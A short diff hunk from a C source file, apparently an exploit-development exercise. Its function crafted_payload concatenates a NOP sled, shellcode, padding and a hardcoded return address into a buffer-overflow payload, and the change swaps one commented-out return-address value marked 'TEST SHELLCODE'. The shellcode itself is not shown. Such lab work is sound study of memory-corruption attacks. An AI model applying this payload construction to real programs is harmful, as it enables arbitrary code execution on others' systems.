@@ -51,7 +51,7 @@ char* crafted_payload(){
 	//char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
 	//char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
 	char retour[] = "\x50\x54\x55\x55\x55\x55"; 			// SAUT OUI_1
-	//char retour[] = "\x88\xdc\xff\xff\xff\x7f";			// TEST SHELLCODE
+	//char retour[] = "\x86\xdb\xff\xff\xff\x7f";			// TEST SHELLCODE
 	//printf("%s\n", retour);
 
 	char *final_buf = malloc((strlen(nops) + strlen(shellcode) + strlen(padding_bp) + strlen(retour)) * sizeof(char));
